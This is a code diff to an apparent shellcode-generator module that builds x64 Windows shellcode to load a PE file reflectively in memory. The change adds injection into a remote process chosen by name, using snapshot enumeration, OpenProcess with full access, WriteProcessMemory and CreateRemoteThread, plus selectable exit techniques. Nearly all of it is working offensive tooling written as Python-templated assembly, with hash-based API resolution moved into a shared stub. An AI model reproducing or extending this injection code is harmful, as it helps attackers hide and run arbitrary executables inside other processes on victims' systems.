@@ -1,20 +1,16 @@
 import sys
-import math
 import ctypes
-import struct
 
 from sickle.common.lib.generic import extract
-from sickle.common.lib.generic import convert
 from sickle.common.lib.generic import modparser
 from sickle.common.lib.programmer import builder
+from sickle.common.lib.programmer import stubhub
 
 from sickle.common.lib.reversing.assembler import Assembler
 
 from sickle.common.headers.windows import (
     winnt,
-    ntdef,
-    ws2def,
-    winternl
+    tlhelp32,
 )
 
 class Shellcode():
@@ -48,25 +44,38 @@ class Shellcode():
     arguments["EXE"]["optional"] = "no"
     arguments["EXE"]["description"] = "Executable to be loaded into memory and executed"
 
+    advanced = {}
+
+    advanced["EXITFUNC"] = {}
+    advanced["EXITFUNC"]["optional"] = "yes"
+    advanced["EXITFUNC"]["description"] = "Exit technique"
+
+    advanced["EXITFUNC"]["options"] = { "terminate": "Terminates the process and all of its threads",
+                                        "thread": "Exit as a thread",
+                                        "process": "Exit as a process" }
+
+    advanced["PROCESS"] = {}
+    advanced["PROCESS"]["optional"] = "yes"
+    advanced["PROCESS"]["description"] = "Process name to inject PE into"
+
     def __init__(self, arg_object):
 
         self.arg_list = arg_object["positional arguments"]
 
         self.dependencies = {
             "Kernel32.dll": [
-                "GetCurrentProcess",
                 "LoadLibraryA",
                 "VirtualAllocEx",
                 "GetProcAddress",
                 "VirtualProtectEx",
                 "CreateRemoteThread",
-                "WaitForSingleObject",
             ],
             "msvcrt.dll" : [
                 "memset",
-                "memcpy",
             ]
         }
+
+        self.set_args()
 
         sc_args = builder.init_sc_args(self.dependencies)
         sc_args.update({
@@ -102,10 +111,64 @@ class Shellcode():
             "dwSecIndex"                    : 0x00,
         })
 
+        if self.process != None:
+            sc_args.update({
+                "ProcessEntry": ctypes.sizeof(tlhelp32._PROCESSENTRY32), 
+                "hSnapshot"   : 0x00,
+                "pid"         : 0x00,
+            })
+
         self.stack_space = builder.calc_stack_space(sc_args)
         self.storage_offsets = builder.gen_offsets(sc_args)
 
         return
+
+    def set_args(self):
+        """Parse user arguments and set default settings where appropriate
+        """
+
+        argv_dict = modparser.argument_check(Shellcode.arguments, self.arg_list)
+        argv_dict.update(modparser.argument_check(Shellcode.advanced, self.arg_list))
+        if (argv_dict == None):
+            exit(-1)
+
+        self.exe_stager = extract.read_bytes_from_file(argv_dict["EXE"])
+        if self.exe_stager == None:
+            exit(-1)
+
+        # If we are injecting into a remote process we will need different API's
+        # than if we are injecting into the target process. So, we only resolve
+        # API's that are important to a given technique.
+        if "PROCESS" not in argv_dict.keys():
+            self.process = None
+            self.dependencies["Kernel32.dll"] += "WaitForSingleObject",
+            self.dependencies["Kernel32.dll"] += "GetCurrentProcess",
+            self.dependencies["msvcrt.dll"] += "memcpy",
+        else:
+            self.process = argv_dict["PROCESS"]
+            self.dependencies["Kernel32.dll"] += "CreateToolhelp32Snapshot",
+            self.dependencies["Kernel32.dll"] += "WriteProcessMemory",
+            self.dependencies["Kernel32.dll"] += "Process32First",
+            self.dependencies["Kernel32.dll"] += "Process32Next",
+            self.dependencies["Kernel32.dll"] += "CloseHandle",
+            self.dependencies["Kernel32.dll"] += "OpenProcess",
+
+        # Set the EXITFUNC and update the necessary dependencies
+        self.exit_func = ""
+        if "EXITFUNC" not in argv_dict.keys():
+            self.exit_func = None
+        else:
+            self.exit_func = argv_dict["EXITFUNC"]
+
+        # Update the necessary dependencies
+        if self.exit_func == "terminate":
+            self.dependencies["Kernel32.dll"] += "TerminateProcess",
+        elif self.exit_func == "thread":
+            self.dependencies["ntdll.dll"] = "RtlExitUserThread",
+        elif self.exit_func == "process":
+            self.dependencies["Kernel32.dll"] += "ExitProcess",
+
+        return 0
 
     def modify_section_perms(self):
         """Modify the permissions for each section in the PE file
@@ -125,8 +188,40 @@ get_lpSectionHeaderArray:
 
 init_dwSecIndex:
     xor rax, rax
-    mov [rbp - {self.storage_offsets['dwSecIndex']}], rax
+    mov [rbp - {self.storage_offsets['dwSecIndex']}], rax\n"""
 
+        if self.process != None:
+            stub += f"""
+copy_section:
+    mov rax, [rbp - {self.storage_offsets['dwSecIndex']}]
+    xor r11, r11
+    mov rdx, [rbp - {self.storage_offsets['lpSectionHeaderArray']}]
+    add rdx, {winnt._IMAGE_SECTION_HEADER.VirtualAddress.offset}
+    mov r11d, [rdx]
+    xor r14, r14
+    mov rdx, [rbp - {self.storage_offsets['lpSectionHeaderArray']}]
+    add rdx, {winnt._IMAGE_SECTION_HEADER.PointerToRawData.offset}
+    mov r14d, [rdx]
+    xor r13, r13
+    mov rdx, [rbp - {self.storage_offsets['lpSectionHeaderArray']}]
+    add rdx, {winnt._IMAGE_SECTION_HEADER.SizeOfRawData.offset}
+    mov r13d, [rdx]
+    mov rcx, [rbp - {self.storage_offsets['lpvLoadedAddress']}]
+    add rcx, r11
+    mov rdx, [rbp - {self.storage_offsets['pResponse']}]
+    add rdx, r14
+
+    xchg rcx, r9
+    mov r8, rdx
+    mov rdx, r9
+    mov r9, r13
+    lea r11, [rsp+0x28]
+    mov [rsp+0x20], r11
+    mov rcx, [rbp - {self.storage_offsets['hProcess']}]
+    mov rax, [rbp - {self.storage_offsets['WriteProcessMemory']}]
+    call rax\n"""
+        else:
+            stub += f"""
 copy_section:
     mov rax, [rbp - {self.storage_offsets['dwSecIndex']}]
     xor r11, r11
@@ -147,8 +242,9 @@ copy_section:
     add rdx, r14
     mov r8, r13
     mov rax, [rbp - {self.storage_offsets['memcpy']}]
-    call rax
+    call rax\n"""
 
+        stub += f"""
 get_mapped_section_size:
     xor rax, rax
     mov [rbp - {self.storage_offsets['dwSectionMappedSize']}], rax
@@ -305,7 +401,28 @@ check_next_section:
         """Write the headers into the newly allocated region
         """
 
-        stub = f"""
+        if self.process != None:
+            stub = f"""
+copy_to_alloc:
+    mov rcx, [rbp - {self.storage_offsets['hProcess']}]
+    
+    mov rdx, [rbp - {self.storage_offsets['lpvLoadedAddress']}]
+    
+    xor r9, r9
+    mov r11, [rbp - {self.storage_offsets['pNtHeader']}]
+    add r11, {winnt._IMAGE_NT_HEADERS64.OptionalHeader.offset}
+    mov r9d, [r11 + {winnt._IMAGE_OPTIONAL_HEADER64.SizeOfHeaders.offset}]
+
+    mov r8, [rbp - {self.storage_offsets['pResponse']}]
+
+    lea r11, [rsp+0x28]
+    mov [rsp+0x20], r11
+
+    mov rax, [rbp - {self.storage_offsets['WriteProcessMemory']}]
+
+    call rax\n"""
+        else:
+            stub = f"""
 copy_to_alloc:
     xor r8, r8
     mov rax, [rbp - {self.storage_offsets['memcpy']}]
@@ -314,8 +431,9 @@ copy_to_alloc:
     add r11, {winnt._IMAGE_NT_HEADERS64.OptionalHeader.offset}
     mov r8d, [r11 + {winnt._IMAGE_OPTIONAL_HEADER64.SizeOfHeaders.offset}]
     mov rdx, [rbp - {self.storage_offsets['pResponse']}]
-    call rax
+    call rax\n"""
 
+        stub += f"""
 change_permissions:
     xor rdx, rdx
     mov r11, [rbp - {self.storage_offsets['pNtHeader']}]
@@ -536,9 +654,9 @@ get_dwTableSize:
     mov rax, {winnt.IMAGE_DIRECTORY_ENTRY_BASERELOC}
     imul rax, {ctypes.sizeof(winnt._IMAGE_DATA_DIRECTORY)}
     add rdx, rax
-    xor rcx, rcx                                                   ; ^
-    mov ecx, [rdx + {winnt._IMAGE_DATA_DIRECTORY.Size.offset}]     ; |
-    mov [rbp - {self.storage_offsets['dwTableSize']}], rcx         ; Looks good
+    xor rcx, rcx
+    mov ecx, [rdx + {winnt._IMAGE_DATA_DIRECTORY.Size.offset}]
+    mov [rbp - {self.storage_offsets['dwTableSize']}], rcx
 
 get_pBaseRelocationTable:
     mov rcx, [rbp - {self.storage_offsets['dwOffsetToBaseRelocationTable']}]
@@ -624,16 +742,99 @@ no_reloc:
 
         return stub
 
+    def get_pid_of(self, target_proc):
+        """Obtains the PID of a target process
+
+        :param target_proc: The name of the target process to inject into
+        :type target_proc: str
+        """
+
+        stub = f"""
+take_snap:
+    mov rcx, {tlhelp32.TH32CS_SNAPPROCESS}
+    xor rdx, rdx
+    mov rax, [rbp - {self.storage_offsets['CreateToolhelp32Snapshot']}]
+    call rax
+    mov [rbp - {self.storage_offsets['hSnapshot']}], rax
+
+setup_PROCESSENTRY32:
+    lea rbx, [rbp - {self.storage_offsets['ProcessEntry']}]
+    mov rdi, rbx
+    xor rax, rax
+    mov rcx, {int(ctypes.sizeof(tlhelp32._PROCESSENTRY32)/8)}
+    rep stosq
+
+    mov dword ptr [rbx], {ctypes.sizeof(tlhelp32._PROCESSENTRY32)}
+
+find_proc:
+    mov rcx, [rbp - {self.storage_offsets['hSnapshot']}]
+    lea rdx, [rbp - {self.storage_offsets['ProcessEntry']}]
+    mov rax, [rbp - {self.storage_offsets['Process32First']}]
+    call rax
+
+check_proc:
+    lea rdx, [rbp - {self.storage_offsets['ProcessEntry']}]
+    add rdx, {tlhelp32._PROCESSENTRY32.szExeFile.offset}
+    xor rcx, rcx
+
+begin_check:"""
+
+        for i in range(len(target_proc) - 1):
+            stub += f"""
+    mov cl, {hex(ord(target_proc[i]))}
+    cmp [rdx + {i}], cl
+    jne next_proc_entry"""
+
+        stub += f"""
+    cmp byte ptr [rdx + {len(target_proc) - 1}], {hex(ord(target_proc[len(target_proc)-1]))}
+    je get_pid
+
+next_proc_entry:
+    mov rax, [rbp - {self.storage_offsets["Process32Next"]}]
+    mov rcx, [rbp - {self.storage_offsets["hSnapshot"]}]
+    lea rdx, [rbp - {self.storage_offsets["ProcessEntry"]}]
+    mov dword ptr [rbx], {ctypes.sizeof(tlhelp32._PROCESSENTRY32)}
+    call rax
+    test rax, rax
+    jnz check_proc
+
+get_pid: 
+    xor rax, rax
+    lea rdx, [rbp - {self.storage_offsets['ProcessEntry']}]
+    add rdx, {tlhelp32._PROCESSENTRY32.th32ProcessID.offset}
+    mov eax, [rdx]
+    mov [rbp - {self.storage_offsets['pid']}], rax
+
+call_CloseHandle:
+    mov rax, [rbp - {self.storage_offsets['CloseHandle']}]
+    mov rcx, [rbp - {self.storage_offsets['hSnapshot']}]
+    call rax
+        """
+
+        return stub
+
     def alloc_image_space(self):
         """Create the allocation where the PE will loaded
         """
 
-        stub = f"""
+        if (self.process != None):
+            stub = self.get_pid_of(self.process)
+            stub += f"""
+call_OpenProcess:
+    mov rax, [rbp - {self.storage_offsets['OpenProcess']}]
+    mov rcx, {winnt.PROCESS_ALL_ACCESS}
+    xor rdx, rdx
+    mov r8, [rbp - {self.storage_offsets['pid']}]
+    call rax
+    mov [rbp - {self.storage_offsets['hProcess']}], rax\n"""
+        else:
+            stub = f"""
 call_GetCurrentProcess:
     mov rax, [rbp - {self.storage_offsets['GetCurrentProcess']}]
     call rax
-    mov [rbp - {self.storage_offsets['hProcess']}], rax
+    mov [rbp - {self.storage_offsets['hProcess']}], rax\n"""
 
+        stub += f"""
 alloc_pe_home:
     mov rcx, [rbp - {self.storage_offsets['hProcess']}]
     xor rdx, rdx
@@ -658,193 +859,23 @@ alloc_pe_home:
 
         return stub
 
-    def get_kernel32(self):
-        """Generates stub for obtaining the base address of Kernel32.dll
+    def gen_main(self):
+        """Returns assembly source code for the main functionality of the stub
         """
 
-        stub = f"""
-getKernel32:
-    push rbp
-    mov rbp, rsp
-    mov dl, 0x4b
-getPEB:
-    mov rcx, 0x60
-    mov r8, gs:[rcx]
-getHeadEntry:
-    mov rdi, [r8 + {winternl._PEB.Ldr.offset}]
-    mov rdi, [rdi + {winternl._PEB_LDR_DATA.InLoadOrderModuleList.offset}]
-search:
-    xor rcx, rcx
-    mov rax, [rdi + {winternl._LDR_DATA_TABLE_ENTRY.DllBase.offset}]
-    mov rsi, [rdi + {winternl._LDR_DATA_TABLE_ENTRY.BaseDllName.offset + ntdef._UNICODE_STRING.Buffer.offset}]
-    mov rdi, [rdi]
-    cmp [rsi + 0x18], cx
-    jne search
-    cmp [rsi], dl
-    jne search
-found:
-    leave
-    ret
-        """
-
-        return stub
-
-    def lookup_function(self):
-        """Generates the stub responsible for obtaining the base address of a function
-        """
-
-        stub = f"""
-lookupFunction:
-    push rbp
-    mov rbp, rsp
-    mov ebx, [rdi + {winnt._IMAGE_DOS_HEADER.e_lfanew.offset}]
-    add rbx, {winnt._IMAGE_NT_HEADERS64.OptionalHeader.offset + winnt._IMAGE_OPTIONAL_HEADER64.DataDirectory.offset}
-    add rbx, rdi
-    mov eax, [rbx]
-    mov rbx, rdi
-    add rbx, rax
-    mov eax, [rbx + {winnt._IMAGE_EXPORT_DIRECTORY.AddressOfFunctions.offset}]
-    mov r8, rdi
-    add r8, rax
-    mov rcx, [rbx + {winnt._IMAGE_EXPORT_DIRECTORY.NumberOfFunctions.offset}]
-parseNames:
-    jecxz error
-    dec ecx
-    mov eax, [r8 + rcx * 4]
-    mov rsi, rdi
-    add rsi, rax
-    xor r9, r9
-    xor rax, rax
-    cld
-calcHash:
-    lodsb
-    test al, al
-    jz calcDone
-    ror r9d, 0xD
-    add r9, rax
-    jmp calcHash
-calcDone:
-    cmp r9d, edx
-    jnz parseNames
-findAddress:
-    mov r8d, [rbx + {winnt._IMAGE_EXPORT_DIRECTORY.AddressOfNames.offset}]
-    add r8, rdi
-    xor rax, rax
-    mov ax, [r8 + rcx * 2]
-    mov r8d, [rbx + {winnt._IMAGE_EXPORT_DIRECTORY.NumberOfNames.offset}]
-    add r8, rdi
-    mov eax, [r8 + rax * 4]
-    add rax, rdi
-error:
-    leave
-    ret
-        """
-
-        return stub
-
-    def load_library(self, lib):
-        """Generates the stub to load a library not currently loaded into a process
-        """
-
-        lists = convert.from_str_to_xwords(lib)
-        write_index = self.storage_offsets['functionName']
-
-        src = "\nload_library_{}:\n".format(lib.rstrip(".dll"))
-
-        for i in range(len(lists["QWORD_LIST"])):
-            src += "    mov rcx, 0x{}\n".format( struct.pack('<Q', lists["QWORD_LIST"][i]).hex() )
-            src += "    mov [rbp-{}], rcx\n".format(hex(write_index))
-            write_index -= 8
-
-        for i in range(len(lists["DWORD_LIST"])):
-            src += "    mov ecx, dword 0x{}\n".format( struct.pack('<L', lists["DWORD_LIST"][i]).hex() )
-            src += "    mov [rbp-{}], ecx\n".format(hex(write_index))
-            write_index -= 4
-
-        for i in range(len(lists["WORD_LIST"])):
-            src += "    mov cx, 0x{}\n".format( struct.pack('<H', lists["WORD_LIST"][i]).hex() )
-            src += "    mov [rbp-{}], cx\n".format(hex(write_index))
-            write_index -= 2
-
-        for i in range(len(lists["BYTE_LIST"])):
-            src += "    mov cl, {}\n".format( hex(lists["BYTE_LIST"][i]) )
-            src += "    mov [rbp-{}], cl\n".format(hex(write_index))
-            write_index -= 1
-
-        src += f"""
-    xor rcx, rcx
-    mov [rbp-{write_index}], cl
-    lea rcx, [rbp - {self.storage_offsets['functionName']}]
-    mov rax, [rbp - {self.storage_offsets['LoadLibraryA']}]
-    call rax
-        """
-
-        return src
-
-    def resolve_functions(self):
-        """This function is responsible for loading all libraries and resolving respective functions
-        """
-
-        stub = ""
-        for lib, imports in self.dependencies.items():
-            if (lib != "Kernel32.dll"):
-                stub += self.load_library(lib)
-                stub += """
-    mov rdi, rax
-                """
-
-            for func in range(len(imports)):
-                stub += f"""
-get_{imports[func]}:
-    mov rdx, {convert.from_str_to_win_hash(imports[func])}
-    call lookupFunction
-    mov [rbp - {self.storage_offsets[imports[func]]}], rax
-                """
-
-        return stub
-
-    def generate_source(self):
-        """Returns bytecode generated by the keystone engine.
-        """
-
-        argv_dict = modparser.argument_check(Shellcode.arguments, self.arg_list)
-        if (argv_dict == None):
-            exit(-1)
-
-        self.exe_stager = extract.read_bytes_from_file(argv_dict["EXE"])
-        if self.exe_stager == None:
-            exit(-1)
-
-        shellcode = f"""
-_start:
-    push rbp
-    mov rbp, rsp
-    sub rsp, {self.stack_space}
-    and rsp, 0xfffffffffffffff0
-
-    call getKernel32
-    mov rdi, rax
-        """
-
-        shellcode += self.resolve_functions()
-
-        shellcode += f"""
+        src = f"""
 load_exe_file:
     lea rax, [rip + exe_file]
     mov [rbp - {self.storage_offsets['pResponse']}], rax
         """
 
-        shellcode += self.alloc_image_space()
+        src += self.alloc_image_space()
+        src += self.rebase_pe()
+        src += self.load_imports()
+        src += self.write_headers()
+        src += self.modify_section_perms()
 
-        shellcode += self.rebase_pe()
-
-        shellcode += self.load_imports()
-
-        shellcode += self.write_headers()
-
-        shellcode += self.modify_section_perms()
-
-        shellcode += f"""
+        src += f"""
 call_CreateRemoteThread:
     xor r9, r9
     mov r8, [rbp - {self.storage_offsets['pNtHeader']}]
@@ -861,35 +892,33 @@ call_CreateRemoteThread:
     xor r8, r8
     mov rax, [rbp - {self.storage_offsets['CreateRemoteThread']}]
     mov rcx, [rbp - {self.storage_offsets['hProcess']}]
-    call rax
+    call rax\n"""
 
+        if self.process == None:
+            src += f"""
 call_WaitForSingleObject:
     mov rcx, rax
     xor rdx, rdx
     dec rdx
     mov rax, [rbp - {self.storage_offsets['WaitForSingleObject']}]
-    call rax
-    ret
-        """
+    call rax\n"""
 
-        shellcode += self.get_kernel32()
-
-        shellcode += self.lookup_function()
-
-        shellcode += self.rva_to_offset()
-
-        shellcode += """
-exe_file:
-"""
-
-        return shellcode
+        return src
 
     def get_shellcode(self):
         """Generates shellcode
         """
 
         generator = Assembler(Shellcode.arch)
-        src = self.generate_source()
+        win_stubs = stubhub.WinRawr(self.storage_offsets,
+                                    self.dependencies,
+                                    self.stack_space,
+                                    self.exit_func)
+
+        main_src = self.gen_main()
+        src = win_stubs.gen_source(main_src)
+        src += self.rva_to_offset()
+        src += "exe_file:\n"
 
         shellcode = generator.get_bytes_from_asm(src)
         shellcode += self.exe_stager
